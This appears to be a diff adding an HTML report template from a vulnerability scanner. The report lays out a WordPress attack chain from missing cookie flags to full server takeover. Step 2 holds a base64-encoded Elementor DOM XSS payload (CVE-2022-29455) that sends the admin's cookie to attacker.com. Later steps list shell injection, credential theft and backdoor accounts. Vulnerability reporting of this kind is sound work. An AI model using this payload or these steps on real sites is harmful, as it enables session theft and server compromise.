@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head><title>Cookie Theft Attack Chain — OmniScan</title>
+<style>
+body { background: #0f0f23; color: #e0e0e0; font-family: 'Segoe UI', Arial; padding: 30px; }
+h1 { color: #ff4757; }
+h2 { color: #ffa502; }
+.step { background: #1a1a3e; padding: 20px; margin: 15px 0; border-radius: 10px; border-left: 4px solid #ff4757; }
+code { background: #000; padding: 3px 8px; border-radius: 4px; color: #0f0; }
+.critical { color: #ff4757; font-weight: bold; }
+</style>
+</head>
+<body>
+<h1>🔓 Full Attack Chain: Cookie Theft → Admin Takeover</h1>
+<p>Target: <b>{{ base_url }}</b></p>
+<p>This document demonstrates how the combination of vulnerabilities leads to full compromise.</p>
+
+<h2>Vulnerability Chain</h2>
+<div class="step">
+<h3>Step 1: Cookie Missing HttpOnly + Secure flags</h3>
+<p>The <code>cookiesession1</code> cookie is accessible via JavaScript and sent over HTTP.</p>
+<p>This means any XSS vulnerability can steal it.</p>
+</div>
+
+<div class="step">
+<h3>Step 2: CVE-2022-29455 — Elementor DOM XSS (Unauthenticated)</h3>
+<p>Send this link to an admin:</p>
+<code>{{ base_url }}/#elementor-action:action=lightbox&settings=eyJodG1sIjoiPGltZyBzcmM9eCBvbmVycm9yPWZldGNoKCdodHRwczovL2F0dGFja2VyLmNvbS9zdGVhbD9jPScrZG9jdW1lbnQuY29va2llKT4ifQ==</code>
+<p>When clicked, the XSS payload steals their session cookie and sends it to attacker.com.</p>
+</div>
+
+<div class="step">
+<h3>Step 3: Session Hijack</h3>
+<p>Attacker receives the cookie at <code>https://attacker.com/steal?c=COOKIE_VALUE</code></p>
+<p>Attacker sets this cookie in their browser → logged in as admin.</p>
+</div>
+
+<div class="step">
+<h3>Step 4: WordPress Admin → Remote Code Execution</h3>
+<p>With admin access, the attacker can:</p>
+<ul>
+<li>Edit theme/plugin PHP files via Appearance → Theme Editor → inject PHP shell</li>
+<li>Upload a malicious plugin → execute arbitrary commands on the server</li>
+<li>Access wp-config.php → steal database credentials</li>
+<li>Create backdoor admin accounts for persistence</li>
+</ul>
+</div>
+
+<div class="step" style="border-left-color: #ff4757;">
+<h3 class="critical">Impact: FULL SERVER COMPROMISE</h3>
+<p>Starting from a single clicked link → Admin access → RCE → Database access → Lateral movement</p>
+</div>
+
+<h2>CVSS Score Estimation</h2>
+<table border="1" cellpadding="8" style="border-collapse:collapse; border-color:#333;">
+<tr><td>Attack Vector</td><td>Network</td></tr>
+<tr><td>Attack Complexity</td><td>Low</td></tr>
+<tr><td>Privileges Required</td><td>None</td></tr>
+<tr><td>User Interaction</td><td>Required (click link)</td></tr>
+<tr><td>Confidentiality</td><td>High</td></tr>
+<tr><td>Integrity</td><td>High</td></tr>
+<tr><td>Availability</td><td>High</td></tr>
+<tr style="color:#ff4757;font-weight:bold;"><td>CVSS 3.1 Score</td><td>8.8 (High)</td></tr>
+</table>
+</body>
+</html>
